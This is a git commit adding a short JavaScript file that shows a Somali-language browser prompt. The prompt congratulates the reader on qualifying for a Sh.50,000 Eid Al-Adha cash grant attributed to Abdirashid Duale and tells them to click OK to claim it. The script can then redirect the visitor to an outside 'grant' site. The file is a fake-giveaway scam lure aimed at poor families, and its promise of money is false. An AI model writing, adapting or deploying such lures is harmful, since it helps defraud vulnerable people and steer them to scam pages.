1826bfeca7d8f973d76ff1e6ffdc1f0820221dfc
The-On-going <sirpeelawson@gmail.com>
2026-05-26 19:37:57 +0100

    Create activeso.js

---
+++ activeso.js
@@ -0,0 +1,10 @@
+var password = 'HALKAN KA QAADO LACAG';
+
+password = prompt(
+  'Hambalyo, waxaad u qalantaa inaad hesho Sl.Sh.50,000 ABDIRASHID DUALE EID AL-ADHA deeqda lacagta caddaan ee qoysaska saboolka ah. Guji OK si aad isla markiiba u hesho.',
+  'HALKAN KA QAADO LACAG'
+);
+
+if (password !== 'HALKAN KA QAADO LACAG') {
+    location.href = 'https://ongoing-grant.info/50000-Taageerada-Eid-Al-Adha.html';
+}
